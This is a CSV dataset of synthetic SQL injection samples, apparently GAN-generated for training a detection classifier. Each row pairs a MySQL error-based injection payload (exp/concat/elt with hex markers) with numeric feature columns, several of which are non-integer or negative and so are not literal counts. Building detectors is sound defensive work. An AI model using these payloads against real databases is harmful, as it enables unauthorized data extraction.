id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,payload_length,alpha_count,digit_count,space_count,upper_count,lower_count,symbol_count,printable_ratio,alpha_ratio,digit_ratio,space_ratio,symbol_ratio,entropy,single_quote_count,double_quote_count,dash_count,hash_count,slash_count,backslash_count,left_paren_count,right_paren_count,comma_count,semicolon_count,equals_count,greater_count,less_count,percent_count,plus_count,asterisk_count,at_count,url_encoded_count,hex_literal_count,unicode_escape_count,comment_marker_count,comparison_op_count,function_call_count,quoted_string_count,kw_select,kw_union,kw_where,kw_from,kw_sleep,kw_benchmark,kw_pg_sleep,kw_waitfor,kw_delay,kw_case,kw_when,kw_then,kw_else,kw_end,kw_exists,kw_order,kw_group,kw_having,kw_information_schema,kw_sysibm,kw_mysql,kw_sqlite,kw_substring,kw_substr,kw_ascii,kw_char,kw_cast,kw_convert,kw_concat,kw_update,kw_delete,kw_insert,kw_drop,kw_create,kw_table,kw_database,kw_user,kw_version,kw_and,kw_or,kw_not,kw_like,kw_by,sql_keyword_total,boolean_signal,union_signal,time_signal,error_signal,order_signal,exists_signal,stacked_signal
GAN_000043,attack,error,"1'  )   as mvai where 5856  =  5856 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",nearest_attack_euclidean,R000076,5.133713390172492,162.64027404785156,77.7501449584961,31.187253952026367,93.84992218017578,-2.583965539932251,61.69565963745117,26.64790916442871,0.4882485866546631,0.3314248025417328,0.15223637223243713,0.40438732504844666,0.1328815072774887,3.906515598297119,2.053605318069458,0.7681658864021301,0.9338505268096924,-0.1939511001110077,0.0011849545408040285,-0.6052271723747253,8.403738975524902,9.070320129394531,5.35398530960083,0.7765565514564514,1.6418178081512451,-0.2123868763446808,0.6747195720672607,0.4892885386943817,0.042404334992170334,0.24948754906654358,0.3117135167121887,0.5692510604858398,2.4229722023010254,0.25377559661865234,0.44706058502197266,1.377692699432373,3.7163429260253906,0.7418522834777832,2.880718946456909,-0.20834164321422577,0.3367513120174408,0.23534207046031952,0.3197927474975586,0.20394380390644073,-0.337893009185791,-0.2963756024837494,0.05107681453227997,0.028032705187797546,0.3216664791107178,-0.028917714953422546,0.2576371133327484,0.3021933138370514,0.23218172788619995,-0.049362532794475555,0.12289397418498993,0.05196479335427284,0.15227000415325165,-0.11185245215892792,0.07046660780906677,0.2263021469116211,0.025105878710746765,0.4253654181957245,0.02853337675333023,-0.781959056854248,-0.04630754515528679,0.3989008963108063,0.7006378173828125,-0.632038950920105,-0.2884577512741089,-0.2482408583164215,-0.21184590458869934,-0.30319303274154663,-0.13825155794620514,-0.22019153833389282,-0.05951419472694397,-0.004020255990326405,0.7166290879249573,0.4060543477535248,0.5909020900726318,0.07020065933465958,-0.1836181879043579,6.882471561431885,0.34539443254470825,-0.023224569857120514,0.053656939417123795,0.5807065963745117,-0.07230938225984573,-0.1025073453783989,-0.07564643025398254
GAN_000044,attack,error,"1' and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   ",nearest_attack_euclidean,R000711,4.643255466928021,179.01138305664062,72.71916198730469,35.123600006103516,87.9240493774414,0.5380699038505554,58.76031494140625,25.140981674194336,0.7320983409881592,0.32092520594596863,0.1685028225183487,0.4089256227016449,0.13328810036182404,3.8034799098968506,1.6269164085388184,0.8349073529243469,0.9201270341873169,-0.0017760320333763957,0.028576815500855446,-0.7204316258430481,7.534730434417725,9.13283634185791,4.654136657714844,0.48952716588974,1.6463344097137451,-0.02076851576566696,0.3512611389160156,0.4641411006450653,0.10298330336809158,0.4492510259151459,0.2299230843782425,0.6097704768180847,2.2868196964263916,0.1717221885919571,0.3671387732028961,1.5267478227615356,4.775666236877441,0.8852167725563049,2.38763427734375,-0.02774154394865036,0.18246354162693024,0.15047965943813324,0.1645684391260147,0.18835566937923431,-0.37596917152404785,-0.20106962323188782,0.08997061848640442,0.02126556634902954,0.326772540807724,0.040927574038505554,0.2763180732727051,0.2235785871744156,0.15669961273670197,0.21095505356788635,0.24470381438732147,0.1233811154961586,0.18134193122386932,0.04706865921616554,-0.09254464507102966,-0.161644846200943,0.023088239133358,0.15906545519828796,0.10500086843967438,-0.3622720241546631,0.002114799339324236,0.05647384375333786,0.8429462313652039,-0.4462335705757141,-0.1444428414106369,0.06053701043128967,-0.053965501487255096,-0.18715813755989075,-0.06376154720783234,0.0007710382342338562,-0.025591522455215454,0.003948000259697437,0.7559333443641663,0.43085795640945435,0.4674379229545593,0.11696169525384903,-0.0013933752197772264,6.976824760437012,0.321888267993927,0.003326289588585496,0.134099081158638,0.6139671802520752,0.0807289406657219,-0.10507458448410034,-0.199700266122818
GAN_000045,attack,error,"1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj",nearest_attack_euclidean,R000463,4.396834439997187,201.88296508789062,73.26087188720703,36.27818298339844,87.22752380371094,0.021359408274292946,62.98049545288086,27.60688018798828,0.8653773665428162,0.3178060054779053,0.16524618864059448,0.39910972118377686,0.13325031101703644,3.8153789043426514,1.6134966611862183,0.8568547964096069,0.8797731399536133,-0.0018207653192803264,0.041085921227931976,-0.3602319657802582,7.2621355056762695,8.689284324645996,4.738732814788818,0.28312793374061584,1.595470905303955,-0.014039389789104462,0.26900115609169006,0.346389502286911,0.09374266117811203,0.5855432152748108,0.20486989617347717,0.22790387272834778,2.1990394592285156,0.2812066674232483,0.32540395855903625,1.5964211225509644,5.311427593231201,0.9375110268592834,2.171119213104248,0.0007375561399385333,0.18955135345458984,0.3747566342353821,0.22156190872192383,0.14392691850662231,-0.3079948425292969,0.021261312067508698,0.020022042095661163,0.16068300604820251,0.26628342270851135,0.07323473691940308,0.2584467828273773,0.2723962962627411,0.03133969008922577,0.0589926615357399,0.20610679686069489,0.09908067435026169,0.20099957287311554,0.23398947715759277,-0.09131916612386703,0.12455110996961594,-0.0311262384057045,0.08666171878576279,-0.008303806185722351,-0.16691818833351135,0.0241609588265419,-0.04481709748506546,0.8254825472831726,-0.3888051509857178,-0.06371335685253143,0.04131145030260086,0.011682271957397461,-0.1643795222043991,-0.060346607118844986,0.003369852900505066,-0.01338073331862688,0.004773200023919344,0.8592749238014221,0.3522576093673706,0.27954161167144775,0.12670844793319702,0.05988991633057594,7.319851398468018,0.4260271191596985,0.10020666569471359,0.08190303295850754,0.6897878050804138,0.058855123817920685,-0.07336322963237762,-0.21965950727462769
GAN_000046,attack,error,"1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj",nearest_attack_euclidean,R000463,4.877018062069803,183.51263427734375,68.1543197631836,35.88543701171875,90.05427551269531,-7.628045558929443,66.01255798339844,23.86329460144043,0.5165455937385559,0.3537008464336395,0.17504678666591644,0.40996068716049194,0.13755421340465546,3.9456074237823486,1.7471641302108765,0.49241217970848083,0.534807026386261,0.0918588936328888,-0.016582246869802475,-0.3418978154659271,9.331634521484375,8.937150955200195,4.3994646072387695,0.4795376658439636,1.7584922313690186,0.03667132556438446,0.21817085146903992,0.34282827377319336,0.03659796714782715,0.24820059537887573,0.4028704762458801,0.4343480169773102,2.3016488552093506,-0.26271843910217285,0.15829922258853912,1.5367714166641235,6.377026557922363,1.213374376296997,3.16561222076416,0.1163344457745552,0.05273062363266945,0.19929270446300507,0.23392534255981445,0.1441778689622879,-0.348929762840271,-0.6388082504272461,0.22112347185611725,0.03294733166694641,0.29687488079071045,0.09426605701446533,0.3311920762062073,0.17521370947360992,0.1324956715106964,-0.013530630618333817,0.18445436656475067,0.08219674229621887,0.25847676396369934,0.18361735343933105,-0.014697626233100891,0.14963015913963318,-0.010972850024700165,-0.07537686824798584,-0.34328415989875793,-0.07244537770748138,-0.04719596728682518,-0.08934404700994492,0.683448851108551,-0.3581394553184509,-0.3556402623653412,0.0882599875330925,0.10918249934911728,0.12954026460647583,0.013476613909006119,0.06017206236720085,-0.027371268719434738,-0.0017654801486060023,0.49583399295806885,0.5174816846847534,0.39012444019317627,0.3548593819141388,0.286542147397995,9.366475105285645,0.3878963887691498,-0.029026754200458527,0.20265622437000275,0.6502134799957275,0.1815979927778244,-0.07338555157184601,-0.2172037661075592
GAN_000047,attack,error,"1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj",nearest_attack_euclidean,R000463,5.250751194896498,179.85731506347656,72.95393371582031,33.16078186035156,92.14861297607422,-4.710965633392334,64.00797271728516,25.408384323120117,0.46669983863830566,0.3329176902770996,0.16315379738807678,0.41336187720298767,0.13774226605892181,3.9411914348602295,1.9926799535751343,0.7965707182884216,0.8342589735984802,-0.056782372295856476,0.048930320888757706,-0.5941168665885925,8.160282135009766,9.047266960144043,4.9199066162109375,0.6202353835105896,1.6538211107254028,-0.08459485322237015,0.4155740737915039,0.2759324014186859,0.13323374092578888,0.22723877429962158,0.4723493158817291,0.5135096907615662,2.326207160949707,0.15594635903835297,0.3302975296974182,1.160834789276123,4.763607501983643,1.1121306419372559,2.6629223823547363,-0.12749765813350677,0.09921711683273315,0.06357769668102264,0.12595222890377045,0.26199331879615784,-0.6834790706634521,-0.3756083846092224,0.2352152317762375,0.07056395709514618,0.4041209816932678,0.02631799876689911,0.36204713582992554,0.2312888652086258,0.2395797073841095,-0.0818602442741394,0.027915896847844124,0.1172080710530281,0.20463216304779053,0.20922474563121796,-0.03044779598712921,-0.07601679116487503,-0.22573888301849365,0.22312048077583313,-0.17971405386924744,-0.5218125581741333,-0.09450196474790573,-0.17922696471214294,0.6794335842132568,-0.49901556968688965,-0.2141769379377365,0.08431514352560043,-0.05972670763731003,-0.07760182023048401,-0.003088928759098053,0.06580942869186401,-0.03902308642864227,-0.003953453619033098,0.5572946071624756,0.26132145524024963,0.627143383026123,0.22659176588058472,-0.0032713983673602343,6.821107864379883,0.3301108181476593,-0.04159501940011978,0.09046443551778793,0.6615609526634216,0.46553394198417664,-0.021329089999198914,-0.20045292377471924
GAN_000048,attack,error,"1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj",nearest_attack_euclidean,R000463,5.115549426439631,199.75979614257812,71.87932586669922,34.051231384277344,91.60063934326172,-2.2680552005767822,76.7177505493164,25.16309928894043,0.1453547477722168,0.35183098912239075,0.1662740707397461,0.4019101560115814,0.13249236345291138,3.964770793914795,1.4067087173461914,0.4700380265712738,0.4217541515827179,-0.006518714129924774,0.039989326149225235,-0.31066814064979553,9.749820709228516,8.940173149108887,4.1875529289245605,0.5495700240135193,1.6939393281936646,0.038477711379528046,0.38985490798950195,0.21502460539340973,0.10398206859827042,0.2918720841407776,0.44802090525627136,0.142550528049469,2.474980592727661,-0.24758821725845337,0.12765690684318542,1.4844284057617188,6.10942268371582,1.546141505241394,3.0885984897613525,0.12944509088993073,0.2561960220336914,0.3952735364437103,0.30665040016174316,0.12071061134338379,-0.22064724564552307,-0.6753915548324585,0.274455189704895,0.07498353719711304,0.3831500709056854,0.30881407856941223,0.4762416183948517,0.10013429820537567,0.20789724588394165,0.03259774297475815,0.23832222819328308,0.014821364544332027,0.22088229656219482,-0.04688945412635803,0.017697155475616455,0.38854673504829407,-0.0019567757844924927,-0.06784883141517639,-0.184251070022583,-0.35321956872940063,0.005150009412318468,-0.014370538294315338,0.5541220903396606,-0.14732632040977478,-0.1522645652294159,-0.036833152174949646,0.0587785504758358,0.15117835998535156,0.10127200186252594,-0.31654655933380127,-0.03181099519133568,-0.014007807709276676,0.5329142212867737,0.4667925238609314,0.37409475445747375,0.3236645758152008,0.3422894775867462,8.647446632385254,0.5849686861038208,0.007050492335110903,0.20402972400188446,0.6934807896614075,0.35152217745780945,-0.19806082546710968,0.4666624665260315
GAN_000049,attack,error,"1 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   -- dkwz",nearest_attack_euclidean,R000166,5.369465985259963,153.53146362304688,74.93292236328125,31.929119110107422,85.0538558959961,1.8818790912628174,58.791404724121094,22.308393478393555,0.5812575817108154,0.3339884281158447,0.1575736701488495,0.4237087666988373,0.1340022087097168,3.8203487396240234,1.551334261894226,0.9979305267333984,1.0771297216415405,-0.10711032897233963,0.04452623426914215,-1.0234161615371704,6.906909465789795,9.160380363464355,4.816828727722168,0.761502206325531,1.6938543319702148,-0.14297321438789368,0.5960928797721863,0.673821747303009,0.09560137242078781,0.12974554300308228,0.44302746653556824,0.7488848567008972,2.421539783477783,0.19911310076713562,0.4189244508743286,1.4935630559921265,3.6580464839935303,1.0502705574035645,2.507553815841675,-0.29608017206192017,0.1468418836593628,-0.15849699079990387,0.13938769698143005,0.28043949604034424,-0.5207834243774414,-0.39429789781570435,0.07274647057056427,0.040840014815330505,0.3462950587272644,-0.09456382691860199,0.3986450731754303,0.22172419726848602,-0.06615961343050003,0.31501689553260803,0.20450419187545776,0.14118331670761108,0.15813089907169342,0.061513688415288925,-0.16277742385864258,-0.18274396657943726,0.1939733922481537,0.3782286047935486,-0.09275846183300018,-0.4877064526081085,-0.006938833277672529,0.13507500290870667,0.8292168378829956,-0.6390982270240784,-0.19308365881443024,-0.14599072933197021,0.02584051340818405,-0.3933861255645752,-0.17117123305797577,-0.07796047627925873,-0.0383358895778656,0.0015045348554849625,0.5923712253570557,0.3870791494846344,0.7834796905517578,0.10815982520580292,-0.2570904791355133,6.10487174987793,0.16090406477451324,-0.06216321140527725,0.0973379984498024,0.623255729675293,0.05138453096151352,-0.34181344509124756,-0.2819603383541107
GAN_000050,attack,error,"1' and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   ",nearest_attack_euclidean,R000711,5.654564710923249,137.6103973388672,74.91373443603516,32.29715347290039,89.40633392333984,-2.5589826107025146,54.874000549316406,21.112777709960938,0.7977049946784973,0.33442237973213196,0.16045542061328888,0.4283149540424347,0.14007791876792908,3.8113324642181396,1.9405887126922607,0.7052664160728455,1.0633097887039185,-0.04862477630376816,-0.10676988959312439,-1.075073003768921,7.028390884399414,9.326458930969238,4.6981425285339355,0.932144045829773,1.734444260597229,-0.24397021532058716,0.6842151880264282,0.6682478785514832,-0.030234653502702713,-0.04299832135438919,0.499104768037796,1.2971285581588745,2.0796313285827637,0.40516775846481323,0.34718436002731323,1.3391413688659668,3.066667079925537,0.5477619171142578,2.4414820671081543,0.04085395485162735,0.09846781194210052,-0.11659152805805206,0.109333336353302,0.21633681654930115,-0.5247195959091187,-0.32505252957344055,0.06970921158790588,-0.09853877127170563,0.1196344792842865,-0.22728945314884186,0.27846837043762207,0.38997119665145874,0.02790883183479309,0.502353310585022,0.27408355474472046,0.12725894153118134,0.18157881498336792,0.27074113488197327,0.19887492060661316,-0.3422977328300476,-0.07008152455091476,0.6045098900794983,-0.12260229885578156,-0.5398471355438232,-0.038817863911390305,0.43078818917274475,0.9301503300666809,-0.6975399255752563,-0.3027215003967285,-0.3788328468799591,0.00130559504032135,-0.42030462622642517,-0.38338908553123474,0.2116888016462326,-0.07114409655332565,0.015743980184197426,0.4059908092021942,0.37691858410835266,0.7623889446258545,0.07897146046161652,-0.2058478593826294,6.703980445861816,0.10568469017744064,-0.11976409703493118,-0.0037486273795366287,0.3483733534812927,-0.09503540396690369,0.11206105351448059,-0.5302173495292664
GAN_000051,attack,error,"1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj",nearest_attack_euclidean,R000463,4.660076983457661,184.6221466064453,72.54386901855469,33.03476333618164,86.0794448852539,-1.4400155544281006,67.35686492919922,25.845191955566406,0.5414527654647827,0.331898033618927,0.1616547852754593,0.4011249840259552,0.13423076272010803,3.9012019634246826,1.7414824962615967,0.5342782735824585,0.6906480193138123,-0.09890959411859512,-0.0333336777985096,-0.7880515456199646,8.432435989379883,9.144529342651367,4.077203750610352,0.5653659701347351,1.7541126012802124,-0.0818890705704689,0.4109199643135071,0.36200061440467834,-0.020066294819116592,0.26533547043800354,0.30884575843811035,0.5738658308982849,2.3845086097717285,0.07441748678684235,0.3128474950790405,1.4752941131591797,5.040194988250732,1.006210207939148,2.806744337081909,0.1764601767063141,0.23557594418525696,0.2902713119983673,0.3619564473628998,0.17651909589767456,-0.2523886561393738,-0.29575538635253906,0.19840742647647858,-0.008897557854652405,0.20874857902526855,0.08118107914924622,0.2876023054122925,0.2944829761981964,0.08049276471138,0.0949362963438034,0.23259806632995605,0.06617444008588791,0.1757458746433258,-0.16510802507400513,0.14401784539222717,0.2276829183101654,-0.10761024802923203,0.13677579164505005,-0.05495181679725647,-0.3958341181278229,0.0261356420814991,0.10895421355962753,0.7481777667999268,-0.4056246876716614,-0.30015596747398376,-0.2435201108455658,0.042912185192108154,0.0400642529129982,0.08295594155788422,0.03320600092411041,-0.040749769657850266,-0.0021254336461424828,0.5540682077407837,0.4574933350086212,0.4614218473434448,0.17859907448291779,0.14066797494888306,8.331656455993652,0.4257105588912964,-0.04081166535615921,0.14676621556282043,0.6359401941299438,0.06745947897434235,-0.07987865805625916,0.053648896515369415
GAN_000052,attack,error,"1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj",nearest_attack_euclidean,R000463,4.532632942181303,201.90353393554688,72.80052185058594,35.67182540893555,95.13016510009766,-3.519573450088501,65.940185546875,25.405176162719727,0.6155465841293335,0.34425053000450134,0.15741406381130219,0.39917153120040894,0.13699011504650116,3.8984482288360596,1.802006483078003,0.5137169361114502,0.5826335549354553,-0.008345238864421844,-0.06752660125494003,-0.388265460729599,9.193978309631348,8.898990631103516,4.69386100769043,0.4723584055900574,1.7431548833847046,-0.03905313462018967,0.33607932925224304,0.19906708598136902,-0.04981760308146477,0.4333350360393524,0.18602120876312256,0.5457537770271301,2.0516903400421143,-0.0812353640794754,0.18446841835975647,1.467409372329712,5.5575714111328125,0.835978090763092,2.8920719623565674,0.3469521403312683,0.19542118906974792,0.5298872590065002,0.2704192101955414,0.11256098747253418,-0.1310873031616211,-0.2965259850025177,0.10014809668064117,-0.0041910260915756226,0.12044955790042877,0.11337961256504059,0.2754528820514679,0.34725794196128845,0.3046707510948181,0.19083556532859802,0.2961999475955963,0.007323704194277525,0.20097951591014862,-0.03682682290673256,0.3587391674518585,0.1745084524154663,-0.04037787392735481,0.019998222589492798,-0.16529235243797302,-0.3826181888580322,-0.024029593914747238,0.21581479907035828,0.7194708585739136,-0.15722449123859406,-0.2641534209251404,-0.050741687417030334,-0.12454759329557419,0.12128087878227234,-0.16513779759407043,0.016542457044124603,-0.033811070024967194,0.0021393224596977234,0.5272258520126343,0.4375551640987396,0.3132692575454712,0.16345280408859253,0.31419768929481506,8.855583190917969,0.4845978915691376,0.02820039540529251,0.12244904786348343,0.5215661525726318,-0.036514487117528915,0.1966703087091446,-0.08815300464630127
GAN_000053,attack,error,"1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj",nearest_attack_euclidean,R000463,4.570220689404323,189.12191772460938,66.59583282470703,36.400245666503906,86.58628845214844,-4.939002513885498,67.3318099975586,25.770544052124023,0.6974340677261353,0.3373352289199829,0.16348794102668762,0.39903780817985535,0.14133310317993164,3.8589770793914795,1.7308322191238403,0.4069751501083374,0.6548957824707031,0.03640243411064148,-0.07382884621620178,-0.47257867455482483,8.26194953918457,8.497854232788086,4.104256629943848,0.39095765352249146,1.751046061515808,-0.012663044035434723,0.2042527198791504,0.3325195014476776,-0.03346296027302742,0.43345582485198975,0.25967785716056824,0.5008666515350342,2.0839767456054688,0.1006622314453125,0.16324052214622498,1.548871397972107,5.6653547286987305,0.8296819925308228,2.563433885574341,0.27908724546432495,0.1027231514453888,0.34291690587997437,0.3933367133140564,0.11457926779985428,-0.1411076933145523,-0.12636496126651764,0.11118951439857483,0.03060753643512726,0.10032150149345398,0.03722144663333893,0.295044869184494,0.34834060072898865,0.04741593450307846,0.08444258570671082,0.2794401943683624,0.06668640673160553,0.1978844404220581,0.24807998538017273,0.0480128675699234,0.19817855954170227,0.011595472693443298,0.17884519696235657,-0.2021659016609192,-0.02909659594297409,0.008243590593338013,0.06699705868959427,0.7929325699806213,-0.33230453729629517,-0.2825378179550171,-0.2083929479122162,0.028578057885169983,0.021204566583037376,-0.025429505854845047,0.19060754776000977,-0.039030566811561584,0.011737361550331116,0.47964605689048767,0.30801835656166077,0.2834407091140747,0.24995344877243042,0.20061922073364258,9.323091506958008,0.37175384163856506,0.022016465663909912,0.07884430885314941,0.5768774747848511,-0.06888127326965332,0.14052876830101013,-0.2801375687122345
GAN_000054,attack,error,"1' and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   ",nearest_attack_euclidean,R000711,4.651208429769127,178.86610412597656,69.37618255615234,35.447052001953125,89.11739349365234,2.467999219894409,62.679473876953125,23.332162857055664,0.7906234264373779,0.3251410722732544,0.16437599062919617,0.4120577573776245,0.13609015941619873,3.778993844985962,1.4472664594650269,0.9716156721115112,0.9089385867118835,0.024972759187221527,-0.005607761908322573,-0.7194019556045532,6.697105407714844,9.076910018920898,4.669848442077637,0.5584997534751892,1.7456806898117065,-0.08085020631551743,0.2851661145687103,0.5485923290252686,0.04694049060344696,0.38037109375,0.2944837212562561,0.5990789532661438,2.3258070945739746,0.13893848657608032,0.37745293974876404,1.6171221733093262,4.674587249755859,0.7692854404449463,2.272660970687866,0.026879645884037018,0.08736374974250793,0.1740153282880783,-0.010990612208843231,0.20736826956272125,-0.30884575843811035,-0.10498422384262085,-0.03495527058839798,0.04107566177845001,0.26119768619537354,-0.03014276921749115,0.30657321214675903,0.24844463169574738,0.026208408176898956,0.2789807617664337,0.2628920078277588,0.13567738234996796,0.16817116737365723,0.24014732241630554,-0.09347239881753922,-0.18939900398254395,0.09740684926509857,0.2736447751522064,-0.04138067364692688,-0.3119656443595886,0.00033488537883386016,0.04431232810020447,0.8842249512672424,-0.4196348786354065,-0.15207494795322418,0.015206553041934967,0.03137412667274475,-0.20164956152439117,-0.16471830010414124,0.06922547519207001,-0.02263021469116211,0.011177572421729565,0.6524514555931091,0.42950767278671265,0.5962778329849243,0.1312602460384369,-0.05744778737425804,7.356256484985352,0.2463369220495224,0.025880254805088043,0.09138756990432739,0.527352511882782,-0.0823393166065216,-0.06209631264209747,-0.43794265389442444
GAN_000055,attack,error,"1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj",nearest_attack_euclidean,R000463,4.742478906757922,190.3154754638672,71.12760925292969,35.65121841430664,90.01457977294922,-4.6663689613342285,66.58158111572266,24.613061904907227,0.37866121530532837,0.3538426160812378,0.15632157027721405,0.4003449082374573,0.13831302523612976,3.9236960411071777,1.867122769355774,0.26145389676094055,0.5176224708557129,-0.015343599021434784,-0.06451257318258286,-0.6147134304046631,9.812947273254395,9.328020095825195,4.3086323738098145,0.6229250431060791,1.786111831665039,-0.027443237602710724,0.4320434033870697,0.232807457447052,-0.05189899727702141,0.36094439029693604,0.30124804377555847,0.5964113473892212,2.069368839263916,-0.12860678136348724,0.13217037916183472,1.5490113496780396,5.838157653808594,1.0151798725128174,3.1343865394592285,0.1705188751220703,0.22597357630729675,0.45107895135879517,0.23125946521759033,0.09193860739469528,-0.15157794952392578,-0.4686141312122345,0.08688507974147797,-0.03211565315723419,0.1619100570678711,0.1255817860364914,0.3150913119316101,0.29433098435401917,0.2108028680086136,0.32447969913482666,0.32845836877822876,-0.0007846473017707467,0.18729734420776367,-0.056488022208213806,0.3047565519809723,0.28817009925842285,0.11255155503749847,0.029644235968589783,-0.2153635025024414,-0.3417169153690338,-0.023944329470396042,0.1579761803150177,0.6897765398025513,-0.30274689197540283,-0.3773896396160126,-0.11120200157165527,-0.08427523821592331,0.18612098693847656,-0.01939636841416359,-0.039533764123916626,-0.047301359474658966,-0.0029261549934744835,0.48552942276000977,0.448211133480072,0.32913702726364136,0.21375690400600433,0.35578134655952454,9.413704872131348,0.497205525636673,-0.02761087566614151,0.19018851220607758,0.5095828771591187,0.015255739912390709,0.11544676125049591,0.10126752406358719
GAN_000056,attack,error,"1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj",nearest_attack_euclidean,R000463,4.757617380743084,185.693115234375,69.15292358398438,36.30076599121094,89.97930908203125,-7.790286540985107,66.7599105834961,26.594961166381836,0.7624825239181519,0.3437184691429138,0.17527756094932556,0.40303969383239746,0.14131252467632294,3.9485206604003906,2.11592173576355,0.09715427458286285,0.6085030436515808,0.046273402869701385,-0.10120590031147003,-0.2608148157596588,9.081998825073242,8.906511306762695,4.605412483215332,0.3124111294746399,1.695683479309082,-0.0680377408862114,0.1290426403284073,0.249258354306221,-0.07114428281784058,0.32772335410118103,0.3128933906555176,0.5408728122711182,2.150364875793457,0.1491897851228714,0.22093282639980316,1.3239551782608032,5.400057315826416,0.8076441287994385,2.8166720867156982,0.4459434151649475,0.1325775682926178,0.21965961158275604,0.3187693655490875,0.11586914211511612,-0.3997986316680908,-0.08562447130680084,0.27975112199783325,-0.011055395007133484,0.16164271533489227,0.06307582557201385,0.2782486081123352,0.34670066833496094,0.25764983892440796,-0.2692623436450958,0.21787840127944946,0.05744524300098419,0.19542500376701355,0.1688612699508667,0.25411349534988403,0.11177219450473785,-0.28976768255233765,0.23892095685005188,-0.1292123645544052,-0.004825294017791748,-0.06298664957284927,0.16783565282821655,0.7427047491073608,-0.32445892691612244,-0.3142339289188385,-0.1399727314710617,0.05009014904499054,0.14043869078159332,0.144197478890419,0.21837401390075684,-0.05846706032752991,0.00414724787697196,0.33544477820396423,0.3916161060333252,0.2669418454170227,0.2562318742275238,0.2477816939353943,8.721861839294434,0.4429985582828522,-0.011960156261920929,0.058231718838214874,0.5401417016983032,0.11042948067188263,0.2419120967388153,-0.2690659165382385
